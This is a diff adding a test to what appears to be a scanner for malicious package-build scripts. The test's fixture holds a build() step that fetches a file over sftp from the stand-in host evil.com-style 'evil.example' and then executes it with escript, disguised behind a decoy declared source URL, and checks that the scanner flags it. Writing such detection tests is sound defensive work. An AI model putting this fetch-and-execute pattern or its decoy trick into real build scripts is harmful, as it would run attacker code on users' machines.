@@ -219,3 +219,19 @@ def test_the_c001_gate_is_configurable():
     fact = scan_diff(text, config=config, package_name="harness-pkg")
     ids = {e.rule_id for e in fact.score_breakdown}
     assert "C002" in ids and "C001" not in ids
+
+
+def test_a_declared_url_decoy_does_not_silence_a_host_form_fetch():
+    """A declared URL as an argument to sftp/ftp is a decoy, not the fetch's
+    address: the client still names a bare host, and the later execution of
+    what it fetched must pair."""
+    fired = _fired(_diff(
+        'build() {\n'
+        '  sftp -b - u@evil.example "https://declared.example/x.tar.gz" '
+        '<<< "get /f.erl"\n'
+        '  escript f.erl\n'
+        '}\n'
+    ).replace(" pkgname=demo\n pkgver=1.0\n",
+              " pkgname=demo\n pkgver=1.0\n"
+              " source=('https://declared.example/x.tar.gz')\n"))
+    assert "H082" in fired
